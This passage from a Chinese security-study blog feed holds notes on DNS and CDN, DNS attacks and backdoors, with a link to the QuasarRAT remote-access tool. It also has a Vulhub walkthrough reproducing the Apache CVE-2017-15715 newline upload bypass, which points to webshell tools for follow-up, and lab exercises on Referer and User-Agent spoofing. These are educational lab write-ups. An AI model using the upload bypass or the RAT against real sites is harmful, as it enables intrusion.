id="3-CDN是什么？与DNS的关系？"><a href="#3-CDN是什么？与DNS的关系？" class="headerlink" title="3.CDN是什么？与DNS的关系？"></a>3.CDN是什么？与DNS的关系？</h3><p>CDN的全称是Content Delivery Netwok，即内容分发网络。CDN的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP如果又使用CDN，PING出来的P就不是用户的真实P而是CDN服务器的IP节点。需要绕过CDN后去找真实P地址:拓展:判断是否存在CDN并绕过，寻找真实!P)。其目的是使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。</p><p><img src="/2021/11/06/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/image4.png" alt="image4"></p><p>扩展:DNS和CDN的区别与联系<a href="https://www.dns.com/supports/710.html">https://www.dns.com/supports/710.html</a></p><h3 id="4-常见的DNS安全攻击有哪些？"><a href="#4-常见的DNS安全攻击有哪些？" class="headerlink" title="4.常见的DNS安全攻击有哪些？"></a>4.常见的DNS安全攻击有哪些？</h3><h4 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h4><p>通常也称为域名系统投毒或DNS缓存投毒。它是利用虚假ntermnet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上。</p><h4 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h4><p>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。这类攻击一般通过恶意软件来更改终端用户TCPIP设置，将用户指向恶意DNS服务器，该DNS服务器会对域名进行解析，并最终指向钓鱼网站等被攻击者操控的服务器。</p><h4 id="域名劫持"><a href="#域名劫持" class="headerlink" title="域名劫持"></a>域名劫持</h4><p>域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的P地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。一旦您的域名被劫持，用户被引到假冒的网站进而无法正常浏览网页，用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p><h4 id="DNS-DDoS攻击"><a href="#DNS-DDoS攻击" class="headerlink" title="DNS DDoS攻击"></a>DNS DDoS攻击</h4><p>针对DNS的DDoS攻击通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源lP发送海星DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。发送大星非法域名查询报文引起DNS服务器持续进行迭代查询，从而达到较少的攻击流量消耗大量服务器资源的目的。</p><h4 id="反射式DNS放大攻击"><a href="#反射式DNS放大攻击" class="headerlink" title="反射式DNS放大攻击"></a>反射式DNS放大攻击</h4><p>所有放大攻击都利用了攻击者和目标Web资源之间的带宽消耗差异，由于每个机器人都要求使用欺骗性IP地址打开DNS解析器，该IP地址已更改为目标受害者的真实源P地址，然后目标会从DNS解析器接收响应。为了创建大量流量，攻击者以尽可能从DNS解析器生成响应的方式构造请求。结果，目标接收到攻击者初始流量的放大，并且他们的网络被虚假流量阻塞，导致拒绝服务。</p><p>当面对各种DNS攻击，墨者安全建议专业的高防DNS防劫持服务，保障服务器的稳定运行，从容应对各种DNS攻击，避免因DNS攻击造成在线业务中断，给企业带来重大损失。</p><h2 id="三、脚本语言"><a href="#三、脚本语言" class="headerlink" title="三、脚本语言"></a>三、脚本语言</h2><h3 id="1-常见的脚本语言类型有哪些"><a href="#1-常见的脚本语言类型有哪些" class="headerlink" title="1.常见的脚本语言类型有哪些?"></a>1.常见的脚本语言类型有哪些?</h3><p>asp php aspx jsp javaweb pl py cgi等</p><h3 id="2-不同脚本类型与安全漏洞的关系"><a href="#2-不同脚本类型与安全漏洞的关系" class="headerlink" title="2.不同脚本类型与安全漏洞的关系?"></a>2.不同脚本类型与安全漏洞的关系?</h3><p>不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样(代码审计)。</p><h3 id="3-漏洞挖掘代码审计与脚本类型的关系"><a href="#3-漏洞挖掘代码审计与脚本类型的关系" class="headerlink" title="3.漏洞挖掘代码审计与脚本类型的关系?"></a>3.漏洞挖掘代码审计与脚本类型的关系?</h3><p>同上</p><h2 id="四、后门"><a href="#四、后门" class="headerlink" title="四、后门"></a>四、后门</h2><h3 id="1-什么是后门-有那些后门"><a href="#1-什么是后门-有那些后门" class="headerlink" title="1.什么是后门?有那些后门?"></a>1.什么是后门?有那些后门?</h3><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。类别:网页、线程插入、扩展、C/S后门。</p><h3 id="2-后门在安全测试中的实际意义"><a href="#2-后门在安全测试中的实际意义" class="headerlink" title="2.后门在安全测试中的实际意义?"></a>2.后门在安全测试中的实际意义?</h3><p>例如后门藏在网页上、软件内，悄无声息的进行攻击者想要的操作。</p><h3 id="3-关于后门需要了解那些-玩法，免杀"><a href="#3-关于后门需要了解那些-玩法，免杀" class="headerlink" title="3.关于后门需要了解那些?(玩法，免杀)"></a>3.关于后门需要了解那些?(玩法，免杀)</h3><p>免杀，简单来讲就是绕过杀毒软件等。</p><h2 id="五、WEB"><a href="#五、WEB" class="headerlink" title="五、WEB"></a>五、WEB</h2><h3 id="1-WEB的组成架构模型"><a href="#1-WEB的组成架构模型" class="headerlink" title="1.WEB的组成架构模型?"></a>1.WEB的组成架构模型?</h3><p>网站源码:分脚本类型，分应用方向操作系统: windows linux<br>中间件(搭建平台): apache iis tomcat nginx等<br>数据库: access mysql mssql oracle sybase db2 postsql等</p><h3 id="⒉-架构漏洞安全测试简要介绍"><a href="#⒉-架构漏洞安全测试简要介绍" class="headerlink" title="⒉.架构漏洞安全测试简要介绍?"></a>⒉.架构漏洞安全测试简要介绍?</h3><h3 id="3-为什么要从WEB层面为主为首"><a href="#3-为什么要从WEB层面为主为首" class="headerlink" title="3.为什么要从WEB层面为主为首?"></a>3.为什么要从WEB层面为主为首?</h3><p>用户接触web层面最多，大部分都是从web页面入手慢憬渗透到服务器。直接从操作系统入手不太现实(大部分情况下接触不到)。</p><h2 id="六、WEB相关安全漏洞"><a href="#六、WEB相关安全漏洞" class="headerlink" title="六、WEB相关安全漏洞"></a>六、WEB相关安全漏洞</h2><h3 id="1-WEB源码类对应漏洞："><a href="#1-WEB源码类对应漏洞：" class="headerlink" title="1.WEB源码类对应漏洞："></a>1.WEB源码类对应漏洞：</h3><p>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等和音</p><h3 id="2-WEB中间件对应漏洞："><a href="#2-WEB中间件对应漏洞：" class="headerlink" title="2.WEB中间件对应漏洞："></a>2.WEB中间件对应漏洞：</h3><p>未授权访问</p><h3 id="3-WEB数据库对应漏洞内核漏洞："><a href="#3-WEB数据库对应漏洞内核漏洞：" class="headerlink" title="3.WEB数据库对应漏洞内核漏洞："></a>3.WEB数据库对应漏洞内核漏洞：</h3><h3 id="4-WEB系统层对应漏洞："><a href="#4-WEB系统层对应漏洞：" class="headerlink" title="4.WEB系统层对应漏洞："></a>4.WEB系统层对应漏洞：</h3><p>远程代码执行，提权</p><h3 id="5-其他第三方对应漏洞第三方软件漏洞："><a href="#5-其他第三方对应漏洞第三方软件漏洞：" class="headerlink" title="5.其他第三方对应漏洞第三方软件漏洞："></a>5.其他第三方对应漏洞第三方软件漏洞：</h3><h3 id="6-APP或PC应用结合类"><a href="#6-APP或PC应用结合类" class="headerlink" title="6.APP或PC应用结合类"></a>6.APP或PC应用结合类</h3><h3 id="7-owasp-top10"><a href="#7-owasp-top10" class="headerlink" title="7.owasp top10"></a>7.owasp top10</h3><h2 id="七、演示案例"><a href="#七、演示案例" class="headerlink" title="七、演示案例"></a>七、演示案例</h2><h3 id="1-多级域名的枚举查找（原理，方式"><a href="#1-多级域名的枚举查找（原理，方式" class="headerlink" title="1.多级域名的枚举查找（原理，方式)"></a>1.多级域名的枚举查找（原理，方式)</h3><p>layer子域名挖掘机、Maltego (kali自带)、各类挖掘子域名的网站:如 https:/<a href="http://www.t1h2ua.cn/tools/">www.t1h2ua.cn/tools/</a></p><h3 id="2-DNS解析修改后分析（本地或服务"><a href="#2-DNS解析修改后分析（本地或服务" class="headerlink" title="2.DNS解析修改后分析（本地或服务)"></a>2.DNS解析修改后分析（本地或服务)</h3><p>把自己电脑的DNS服务的改成手动获取，并换dns(比如先8.8.8.8，再114.114.114.114)，分别ping同一网站，看解析出来的ip是否不同。</p><h3 id="3-EXE后门功能及危害及类似WEB后门"><a href="#3-EXE后门功能及危害及类似WEB后门" class="headerlink" title="3.EXE后门功能及危害及类似WEB后门"></a>3.EXE后门功能及危害及类似WEB后门</h3><p>Quasar后门程序（.exe)生成并使用: <a href="https://blog.csdn.net/qq_44930903/article/details/111600982">https://blog.csdn.net/qq_44930903/article/details/111600982</a><br>web后门: beef、WSExploer抓包、wireshark抓包等</p><h3 id="4-APP类结合WEB协议，PC类结合WEB协议"><a href="#4-APP类结合WEB协议，PC类结合WEB协议" class="headerlink" title="4.APP类结合WEB协议，PC类结合WEB协议"></a>4.APP类结合WEB协议，PC类结合WEB协议</h3><p>Burp Suite抓app的包，然后改包发送等;<br>Apl数据提取(安卓逆向工具)∶下载下方资源、解压，然后把一个apk文件放入到apps文件夹，运行exe文件，之后会生成results文件，apk的数据就在这里。</p><h2 id="八、设计资源"><a href="#八、设计资源" class="headerlink" title="八、设计资源"></a>八、设计资源</h2><p>逍遥模拟器: <a href="http://www.xyaz.cn/">http://www.xyaz.cn</a><br>WSExplorer抓包工具: <a href="http://www.downcc.com/soft/11196.html">http://www.downcc.com/soft/11196.html</a><br>Quasar后门程序生成: <a href="https://github.com/quasar/QuasarRAT/releases">https://github.com/quasar/QuasarRAT/releases</a></p><p>Apk数据提取: <a href="https://github.com/TheKingOfDuck/ApkAnalyser">https://github.com/TheKingOfDuck/ApkAnalyser</a></p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全学习，学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于vulhub文档总结的中间件漏洞的部分复现</title>
      <link href="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>vulhub官方文档：<a href="https://vulhub.org/">https://vulhub.org/</a></p><h1 id="什么是Vulhub"><a href="#什么是Vulhub" class="headerlink" title="什么是Vulhub?"></a>什么是Vulhub?</h1><p>Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。Vulhub的官方地址为<a href="https://www.cnblogs.comwww.vulhub.org/">www.vulhub.org</a>。</p><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>因为Vulhub是一个基于docker和docker-compose的漏洞环境集合，所以，第一步我们需要安装docker，切换成root用户，象征性的更新一下软件，输入如下命令</p><p><code>sudo apt-get update</code></p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image1.png" alt="image1"></p><p>安装https协议、CA证书</p><p><code>apt-get install -y apt-transport-https ca-certificates</code></p><p>安装docker</p><p><code>sudo apt install docker.io</code></p><p>查看docker版本来检查是否安装成功</p><p><code>docker -v</code></p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image2.png" alt="image2"></p><p>启动docker:</p><p><code>systemctl start docker</code></p><p>停止docker:</p><p><code>systemctl stop docker</code></p><p>重启docker:</p><p><code>systemctl restart docker</code></p><p>查看docker状态:</p><p><code>systemctl status docker</code></p><p>开机启动:</p><p><code>systemctl enable docker</code></p><p>查看docker概要信息：</p><p><code>docker info</code></p><p>查看docker帮助文档：</p><p><code>docker --help</code></p><p>更多docker相关信息可参考<a href="https://docker.shujuwajue.com/docker-an-zhuang">https://docker.shujuwajue.com/docker-an-zhuang</a></p><p>pip安装docker-compose</p><p><code>pip3 install docker-compose</code></p><p>查看docker-compose版本：</p><p><code>docker-compose -v</code></p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image3.png" alt="image3"></p><h1 id="下载vulhub"><a href="#下载vulhub" class="headerlink" title="下载vulhub"></a>下载vulhub</h1><p>下载vulhub源码，地址：<a href="https://github.com/vulhub/vulhub%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E8%A7%A3%E5%8E%8B%E8%87%B3ubuntu%E4%B8%AD%E3%80%82">https://github.com/vulhub/vulhub，下载后解压至ubuntu中。</a></p><p>或者通过git命令搬运</p><p><code>git clone https://github.com/vulhub/vulhub.git</code></p><p>下载成功后进入到vulhub目录，查看漏洞靶场</p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image4.png" alt="image4"></p><p>随便进入一个目录（比如Apache HTTPD换行解析漏洞(CVE-2017-15715)）</p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image5.png" alt="image5"></p><p>启动环境</p><p><code>docker-compose build</code></p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image6.png" alt="image6"></p><p><code>docker-compose up -d</code></p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image7.png" alt="image7"></p><p>查看启动环境，发现端口是8080</p><p><code>docker-compose ps</code></p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image8.png" alt="image8"></p><p>或者查看靶场配置</p><p><code>docker-compose config</code></p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image9.png" alt="image9"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>本地输入自己ip地址访问该靶场</p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image10.png" alt="image10"></p><p>正常上传一个php文件，比如1.php，会上传失败</p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image11.png" alt="image11"></p><p>网上找到这个靶场的源代码</p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image12.png" alt="image12"></p><p>从这段源代码中我们可以得知上传1.php和1.php%0a是不一样的，我们正常上传1.php是无法通过的，但上传1.php%0a就可以绕过</p><p>另外在该版本的配置中有这么一段配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>意思是只要满足这么一个正则匹配，就会告知Apache将这个满足匹配的文件按照PHP文件来解析</p><p>在.php后面接有一个$，它是用来匹配字符串结尾位置的，如果设置了RegExp对象(正则表达式)的Multiline(/m)属性，那么$还会匹配到字符串结尾的换行符（也就是%0a），于是就常升了这么一个换行解析漏洞。</p><p>于是我们只需要在抓到的请求数据包中在1.php文件名后面加上%0a，但不能直接在1.php文件名后面加，因为在Get传参是有URL的编码解码的，但我们这里是POST传参，没有，因此我们通过Hex编码的方式手动加上。</p><p>我们先直接在文件名后面加一个a（因为a的十六进制的编码是61）</p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image13.png" alt="image13"></p><p>然后在Hex里面找到这个61，修改成0a就可以了</p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image14.png" alt="image14"></p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image15.png" alt="image15"></p><p>修改后放过数据包，然后再访问这个数据包</p><p><img src="/2021/11/06/%E5%85%B3%E4%BA%8Evulhub%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image16.png" alt="image16"></p><p>显示php文件解析成功，但这个文件后缀不是php，说明目标存在解析漏洞！之后我们可以利用如中国菜刀、蚁剑之类的工具来通过这个php代码对网站目录进行渗透。</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间漏洞，漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者在线靶场学习（一）</title>
      <link href="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><strong>在线靶场主页：<a href="http://www.mozhe.cn/">www.mozhe.cn</a></strong></p><p>进入在线靶场，找到网络安全</p><h1 id="靶场一——来源页伪造"><a href="#靶场一——来源页伪造" class="headerlink" title="靶场一——来源页伪造"></a>靶场一——来源页伪造</h1><h2 id="背景介绍："><a href="#背景介绍：" class="headerlink" title="背景介绍："></a>背景介绍：</h2><p>安全工程师“墨者”在访问一个网页时，提示只能通过另一个页面跳转的方式访问，这该如何办？</p><h2 id="实训目标："><a href="#实训目标：" class="headerlink" title="实训目标："></a>实训目标：</h2><ul><li>了解浏览器的使用；</li><li>了解数据包的发送；</li><li>了解抓包工具的使用，能够进行抓包改包，如burpsuite等；<br>（掌握：达到能够独立完成使用的程度<br>了解：达到知晓其作用的程度不要求熟练运用）</li></ul><h2 id="解题方向："><a href="#解题方向：" class="headerlink" title="解题方向："></a>解题方向：</h2><p>充分理解题目，referer伪造！</p><p><strong>1.启动靶场，利用火狐浏览器设置代理</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image1.png" alt="image1"></p><p><strong>2.在burpsuite中设置代理并打开</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image2.png" alt="image2"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image4.png" alt="image4"></p><p><strong>3.进入靶场，并点击，此时burpsuite会抓到点击的请求，放过</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image3.png" alt="image3"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image5.png" alt="image5"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image6.png" alt="image6"></p><p><strong>4.于是我们得对抓到的请求数据包进行修改，修改来源页是google.com</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image7.png" alt="image7"></p><p><strong>5.获取Key成功！</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image8.png" alt="image8"></p><h2 id="靶场二——浏览其信息伪造"><a href="#靶场二——浏览其信息伪造" class="headerlink" title="靶场二——浏览其信息伪造"></a>靶场二——浏览其信息伪造</h2><h3 id="背景介绍：-1"><a href="#背景介绍：-1" class="headerlink" title="背景介绍："></a><strong>背景介绍：</strong></h3><p>小墨了解到从微信6.0开始，其内嵌的浏览器在User Agent字符串中增加了NetType字段用于标识客户端（手机）当前的网络环境,增加之后真的安全吗？</p><h3 id="实训目标：-1"><a href="#实训目标：-1" class="headerlink" title="实训目标："></a>实训目标：</h3><ul><li>User-Agent的理解</li><li>微信浏览器内嵌新增取值内容</li><li>使用BurpSuite工具修改内容</li></ul><h3 id="解题方向"><a href="#解题方向" class="headerlink" title="解题方向;"></a>解题方向;</h3><p>根据页面提示,抓包分析除了判断浏览器类型还判断了微信特有的NetType</p><p><strong>1.进入靶场</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image9.png" alt="image9"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image10.png" alt="image10"></p><p><strong>2.利用Burpsuite抓取点击请求的数据包，并百度搜索NetType，寻找对应的iphone手机的2G显示</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image11.png" alt="image11"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image12.png" alt="image12"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image13.png" alt="image13"></p><p><strong>3.获取Key成功！</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image14.png" alt="image14"></p><h2 id="靶场三——HTTP动作练习"><a href="#靶场三——HTTP动作练习" class="headerlink" title="靶场三——HTTP动作练习"></a>靶场三——HTTP动作练习</h2><h3 id="背景介绍：-2"><a href="#背景介绍：-2" class="headerlink" title="背景介绍："></a>背景介绍：</h3><p>某日，安全工程师”墨者”对一企业办公系统的源代码进行授权检测，在检查过程中，发现程序员(可能是临时工)使用PHP程序，处理服务端接收客户端传递的数据时，使用的是$_REQUEST[]，前端使用的是GET方式，然后就遇到问题了”Request-URI Too Long”。</p><h3 id="实训目标：-2"><a href="#实训目标：-2" class="headerlink" title="实训目标："></a>实训目标：</h3><ul><li>掌握在浏览器发送数据时、GET、POST两者方式的差异；</li><li>理解在PHP程序中$_REQUEST、$_GET、$_POST三者之间的区别；</li><li>了解不同浏览器通过GET方式传递数据时，限制数据长度的大小；</li></ul><h3 id="解题方向：-1"><a href="#解题方向：-1" class="headerlink" title="解题方向："></a>解题方向：</h3><p>通过POST方式提交”content”数据内容,查看服务端返回的结果。</p><p><strong>1.进入靶场</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image15.png" alt="image15"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image16.png" alt="image16"></p><p><strong>此处的content就是请求体，在POST方式提交时请求体应该放在末尾空一行后面</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image17.png" alt="image17"></p><p><strong>2.放过修改后的数据包，发现仍然不行</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image18.png" 